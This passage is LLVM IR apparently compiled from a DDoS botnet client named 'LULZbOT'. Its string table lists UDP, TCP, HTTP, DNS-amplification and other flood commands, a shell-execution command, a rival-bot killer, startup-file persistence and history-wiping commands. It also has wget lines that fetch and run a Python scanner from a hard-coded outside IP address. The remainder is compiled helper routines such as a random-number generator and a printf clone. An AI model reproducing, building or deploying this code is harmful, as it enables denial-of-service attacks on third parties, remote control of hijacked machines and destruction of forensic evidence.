@.str.404 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.405 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.406 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.407 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.408 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.409 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.410 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.411 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.412 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.413, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.415, i32 0, i32 0)], align 16
@.str.416 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\0D\0A\00", align 1
@.str.413 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.414 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.415 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.417 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.418 = private unnamed_addr constant [10 x i8] c"./DNS.txt\00", align 1
@.str.419 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.420 = private unnamed_addr constant [12 x i8] c"irctc.co.in\00", align 1
@.str.421 = private unnamed_addr constant [10 x i8] c"pkill -9 \00", align 1
@.str.422 = private unnamed_addr constant [20 x i8] c"||busybox pkill -9 \00", align 1
@.str.423 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.424 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@.str.425 = private unnamed_addr constant [21 x i8] c"cd /var/tmp; rm -f *\00", align 1
@.str.426 = private unnamed_addr constant [4 x i8] c"%d\0A\00", align 1
@.str.427 = private unnamed_addr constant [8 x i8] c"http://\00", align 1
@.str.428 = private unnamed_addr constant [132 x i8] c"GET /%s HTTP/1.1\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: */*\0D\0AConnection: Keep-Alive\0D\0A\0D\0A\00", align 1
@.str.429 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.430 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.431 = private unnamed_addr constant [7 x i8] c"PYTHON\00", align 1
@.str.432 = private unnamed_addr constant [8 x i8] c"INSTALL\00", align 1
@.str.433 = private unnamed_addr constant [139 x i8] c"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget http://199.38.245.222/good2.py\00", align 1
@.str.434 = private unnamed_addr constant [26 x i8] c"INSTALLING PYTHON SCANNER\00", align 1
@.str.435 = private unnamed_addr constant [5 x i8] c"bins\00", align 1
@.str.436 = private unnamed_addr constant [56 x i8] c"cd /.tmp;rm -rf *py;wget http://199.38.245.222/good2.py\00", align 1
@.str.437 = private unnamed_addr constant [24 x i8] c"UPDATING PYTHON SCANNER\00", align 1
@.str.438 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.439 = private unnamed_addr constant [31 x i8] c"killall -9 python;pkill python\00", align 1
@.str.440 = private unnamed_addr constant [24 x i8] c"STOPPING PYTHON SCANNER\00", align 1
@.str.441 = private unnamed_addr constant [6 x i8] c"START\00", align 1
@.str.442 = private unnamed_addr constant [40 x i8] c"cd /.tmp;python good2.py 1000 LUCKY 1 3\00", align 1
@.str.443 = private unnamed_addr constant [25 x i8] c"STARTING LE HACKA SCANNA\00", align 1
@.str.444 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.445 = private unnamed_addr constant [6 x i8] c"TABLE\00", align 1
@.str.446 = private unnamed_addr constant [23 x i8] c"bins TAKEN SUCCESFULLY\00", align 1
@.str.447 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.448 = private unnamed_addr constant [17 x i8] c"STOPPING SCANNER\00", align 1
@.str.449 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.450 = private unnamed_addr constant [26 x i8] c"STARTING SCANNER ON -> %s\00", align 1
@.str.451 = private unnamed_addr constant [8 x i8] c"BOTKILL\00", align 1
@.str.452 = private unnamed_addr constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00", align 1
@.str.453 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.454 = private unnamed_addr constant [17 x i8] c"My Public IP: %s\00", align 1
@.str.455 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.456 = private unnamed_addr constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00", align 1
@.str.457 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.458 = private unnamed_addr constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00", align 1
@.str.459 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.460 = private unnamed_addr constant [50 x i8] c"HTTP <method> <host> <port> <path> <time> <power>\00", align 1
@.str.461 = private unnamed_addr constant [4 x i8] c"DNS\00", align 1
@.str.462 = private unnamed_addr constant [91 x i8] c"DNS <target IP> <port> <reflection file url> <forks> <pps limiter, -1 for no limit> <time>\00", align 1
@.str.463 = private unnamed_addr constant [58 x i8] c"DNS amplification flooding %s:%s for %d seconds at %d pps\00", align 1
@.str.464 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.465 = private unnamed_addr constant [28 x i8] c"HOLD <target> <port> <time>\00", align 1
@.str.466 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.467 = private unnamed_addr constant [24 x i8] c"JUNK <ip> <port> <time>\00", align 1
@.str.468 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.469 = private unnamed_addr constant [27 x i8] c"STD <target> <port> <time>\00", align 1
@.str.470 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.471 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.472 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.473 = private unnamed_addr constant [22 x i8] c"KILLMYEYEPEEUSINGHOIC\00", align 1
@.str.474 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.475 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.476 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.477 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.478 = private unnamed_addr constant [9 x i8] c"LULZbOT\0A\00", align 1
@.str.479 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.480 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.481 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.482 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.483 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.485 = private unnamed_addr constant [12 x i8] c"BUILD %s:%s\00", align 1
@.str.486 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.487 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.488 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.489 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.490 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.491 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@str = private unnamed_addr constant [8 x i8] c"LULZbOT\00"

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #15
  %3 = add i64 %2, 4294967295
  %sext = shl i64 %3, 32
  %4 = ashr exact i64 %sext, 32
  %5 = getelementptr inbounds i8, i8* %0, i64 %4
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i64
  %8 = inttoptr i64 %7 to i8*
  %9 = tail call i32 @strcmp(i8* %8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i64 0, i64 0)) #15
  %10 = icmp eq i32 %9, 0
  br label %11

; <label>:11:                                     ; preds = %11, %1
  br i1 %10, label %11, label %.preheader

.preheader:                                       ; preds = %11
  %12 = trunc i64 %3 to i32
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %.critedge._crit_edge, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext29 = shl i64 %3, 32
  %14 = ashr exact i64 %sext29, 32
  br label %.lr.ph22

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %26
  %indvars.iv27 = phi i64 [ %14, %.lr.ph22.preheader ], [ %indvars.iv.next28, %26 ]
  %.021 = phi i32 [ %12, %.lr.ph22.preheader ], [ %27, %26 ]
  %15 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %16 = load i8, i8* %15, align 1
  %17 = sext i8 %16 to i64
  %18 = inttoptr i64 %17 to i8*
  %19 = tail call i32 @strcmp(i8* %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i64 0, i64 0)) #15
  %20 = icmp eq i32 %19, 0
  %21 = trunc i64 %indvars.iv27 to i32
  br i1 %20, label %26, label %.critedge.preheader

.critedge.preheader:                              ; preds = %26, %.lr.ph22
  %.0.lcssa = phi i32 [ %21, %.lr.ph22 ], [ %27, %26 ]
  %22 = icmp slt i32 %.0.lcssa, 0
  br i1 %22, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %23 = sext i32 %.0.lcssa to i64
  %24 = add nsw i64 %23, 1
  %xtraiter = and i64 %24, 7
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.critedge.prol.loopexit, label %.critedge.prol.preheader

.critedge.prol.preheader:                         ; preds = %.critedge.preheader26
  br label %.critedge.prol

.critedge.prol:                                   ; preds = %.critedge.prol, %.critedge.prol.preheader
  %indvars.iv.prol = phi i64 [ 0, %.critedge.prol.preheader ], [ %indvars.iv.next.prol, %.critedge.prol ]
  %prol.iter = phi i64 [ %xtraiter, %.critedge.prol.preheader ], [ %prol.iter.sub, %.critedge.prol ]
  %indvars.iv.next.prol = add nsw i64 %indvars.iv.prol, 1
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.critedge.prol.loopexit.unr-lcssa, label %.critedge.prol, !llvm.loop !1

.critedge.prol.loopexit.unr-lcssa:                ; preds = %.critedge.prol
  br label %.critedge.prol.loopexit

.critedge.prol.loopexit:                          ; preds = %.critedge.preheader26, %.critedge.prol.loopexit.unr-lcssa
  %indvars.iv.unr = phi i64 [ 0, %.critedge.preheader26 ], [ %indvars.iv.next.prol, %.critedge.prol.loopexit.unr-lcssa ]
  %indvars.iv.next.lcssa.unr = phi i64 [ undef, %.critedge.preheader26 ], [ %indvars.iv.next.prol, %.critedge.prol.loopexit.unr-lcssa ]
  %25 = icmp ult i32 %.0.lcssa, 7
  br i1 %25, label %.critedge._crit_edge.loopexit, label %.critedge.preheader26.new

.critedge.preheader26.new:                        ; preds = %.critedge.prol.loopexit
  br label %.critedge

; <label>:26:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %27 = add nsw i32 %.021, -1
  %28 = icmp sgt i64 %indvars.iv27, 0
  br i1 %28, label %.lr.ph22, label %.critedge.preheader

.critedge:                                        ; preds = %.critedge, %.critedge.preheader26.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.critedge.preheader26.new ], [ %indvars.iv.next.7, %.critedge ]
  %indvars.iv.next.6 = add nsw i64 %indvars.iv, 7
  %indvars.iv.next.7 = add nsw i64 %indvars.iv, 8
  %29 = icmp slt i64 %indvars.iv.next.6, %23
  br i1 %29, label %.critedge, label %.critedge._crit_edge.loopexit.unr-lcssa

.critedge._crit_edge.loopexit.unr-lcssa:          ; preds = %.critedge
  br label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge.prol.loopexit, %.critedge._crit_edge.loopexit.unr-lcssa
  %indvars.iv.next.lcssa = phi i64 [ %indvars.iv.next.lcssa.unr, %.critedge.prol.loopexit ], [ %indvars.iv.next.7, %.critedge._crit_edge.loopexit.unr-lcssa ]
  %sext30 = shl i64 %indvars.iv.next.lcssa, 32
  %phitmp = ashr exact i64 %sext30, 32
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.preheader, %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ 0, %.critedge.preheader ], [ %phitmp, %.critedge._crit_edge.loopexit ], [ 0, %.preheader ]
  %30 = getelementptr inbounds i8, i8* %0, i64 %.019.lcssa
  store i8 0, i8* %30, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %153, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %153 ]
  %.0 = phi i8* [ %1, %3 ], [ %154, %153 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %149 [
    i8 0, label %155
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader70 [
    i8 0, label %155
    i8 37, label %149
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader70

.preheader70:                                     ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off74 = add i8 %34, -48
  %35 = icmp ult i8 %.off74, 10
  br i1 %35, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.172, i64 1
  %37 = or i32 %.06371, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %40 = phi i8 [ %46, %.lr.ph77 ], [ %34, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %45, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %44, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06475, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.276, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %153 [
    i8 115, label %48
    i8 100, label %68
    i8 120, label %84
    i8 88, label %100
    i8 117, label %116
    i8 99, label %132
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in69 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in69 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = sext i32 %61 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = icmp ne i32 %61, 0
  %65 = select i1 %64, i8* %63, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.492, i64 0, i64 0)
  %66 = tail call fastcc i32 @prints(i8** %0, i8* %65, i32 %.064.lcssa, i32 %.063.lcssa)
  %67 = add nsw i32 %66, %.061
  br label %153

; <label>:68:                                     ; preds = %.critedge
  %69 = load i32, i32* %8, align 8
  %70 = icmp ult i32 %69, 41
  br i1 %70, label %71, label %76

; <label>:71:                                     ; preds = %68
  %72 = load i8*, i8** %9, align 8
  %73 = sext i32 %69 to i64
  %74 = getelementptr i8, i8* %72, i64 %73
  %75 = add i32 %69, 8
  store i32 %75, i32* %8, align 8
  br label %79

; <label>:76:                                     ; preds = %68
  %77 = load i8*, i8** %10, align 8
  %78 = getelementptr i8, i8* %77, i64 8
  store i8* %78, i8** %10, align 8
  br label %79

; <label>:79:                                     ; preds = %76, %71
  %.in68 = phi i8* [ %74, %71 ], [ %77, %76 ]
  %80 = bitcast i8* %.in68 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = tail call fastcc i32 @printi(i8** %0, i32 %81, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %83 = add nsw i32 %82, %.061
  br label %153

; <label>:84:                                     ; preds = %.critedge
  %85 = load i32, i32* %11, align 8
  %86 = icmp ult i32 %85, 41
  br i1 %86, label %87, label %92

; <label>:87:                                     ; preds = %84
  %88 = load i8*, i8** %12, align 8
  %89 = sext i32 %85 to i64
  %90 = getelementptr i8, i8* %88, i64 %89
  %91 = add i32 %85, 8
  store i32 %91, i32* %11, align 8
  br label %95

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %13, align 8
  %94 = getelementptr i8, i8* %93, i64 8
  store i8* %94, i8** %13, align 8
  br label %95

; <label>:95:                                     ; preds = %92, %87
  %.in67 = phi i8* [ %90, %87 ], [ %93, %92 ]
  %96 = bitcast i8* %.in67 to i32*
  %97 = load i32, i32* %96, align 4
  %98 = tail call fastcc i32 @printi(i8** %0, i32 %97, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %99 = add nsw i32 %98, %.061
  br label %153

; <label>:100:                                    ; preds = %.critedge
  %101 = load i32, i32* %14, align 8
  %102 = icmp ult i32 %101, 41
  br i1 %102, label %103, label %108

; <label>:103:                                    ; preds = %100
  %104 = load i8*, i8** %15, align 8
  %105 = sext i32 %101 to i64
  %106 = getelementptr i8, i8* %104, i64 %105
  %107 = add i32 %101, 8
  store i32 %107, i32* %14, align 8
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i8*, i8** %16, align 8
  %110 = getelementptr i8, i8* %109, i64 8
  store i8* %110, i8** %16, align 8
  br label %111

; <label>:111:                                    ; preds = %108, %103
  %.in66 = phi i8* [ %106, %103 ], [ %109, %108 ]
  %112 = bitcast i8* %.in66 to i32*
  %113 = load i32, i32* %112, align 4
  %114 = tail call fastcc i32 @printi(i8** %0, i32 %113, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %115 = add nsw i32 %114, %.061
  br label %153

; <label>:116:                                    ; preds = %.critedge
  %117 = load i32, i32* %17, align 8
  %118 = icmp ult i32 %117, 41
  br i1 %118, label %119, label %124

; <label>:119:                                    ; preds = %116
  %120 = load i8*, i8** %18, align 8
  %121 = sext i32 %117 to i64
  %122 = getelementptr i8, i8* %120, i64 %121
  %123 = add i32 %117, 8
  store i32 %123, i32* %17, align 8
  br label %127

; <label>:124:                                    ; preds = %116
  %125 = load i8*, i8** %19, align 8
  %126 = getelementptr i8, i8* %125, i64 8
  store i8* %126, i8** %19, align 8
  br label %127

; <label>:127:                                    ; preds = %124, %119
  %.in65 = phi i8* [ %122, %119 ], [ %125, %124 ]
  %128 = bitcast i8* %.in65 to i32*
  %129 = load i32, i32* %128, align 4
  %130 = tail call fastcc i32 @printi(i8** %0, i32 %129, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %131 = add nsw i32 %130, %.061
  br label %153

; <label>:132:                                    ; preds = %.critedge
  %133 = load i32, i32* %20, align 8
  %134 = icmp ult i32 %133, 41
  br i1 %134, label %135, label %140

; <label>:135:                                    ; preds = %132
  %136 = load i8*, i8** %21, align 8
  %137 = sext i32 %133 to i64
  %138 = getelementptr i8, i8* %136, i64 %137
  %139 = add i32 %133, 8
  store i32 %139, i32* %20, align 8
  br label %143

; <label>:140:                                    ; preds = %132
  %141 = load i8*, i8** %24, align 8
  %142 = getelementptr i8, i8* %141, i64 8
  store i8* %142, i8** %24, align 8
  br label %143

; <label>:143:                                    ; preds = %140, %135
  %.in = phi i8* [ %138, %135 ], [ %141, %140 ]
  %144 = bitcast i8* %.in to i32*
  %145 = load i32, i32* %144, align 4
  %146 = trunc i32 %145 to i8
  store i8 %146, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %147 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  %148 = add nsw i32 %147, %.061
  br label %153

; <label>:149:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %150 = load i8, i8* %.3, align 1
  %151 = zext i8 %150 to i32
  tail call fastcc void @printchar(i8** %0, i32 %151)
  %152 = add nsw i32 %.061, 1
  br label %153

; <label>:153:                                    ; preds = %.critedge, %149, %143, %127, %111, %95, %79, %59
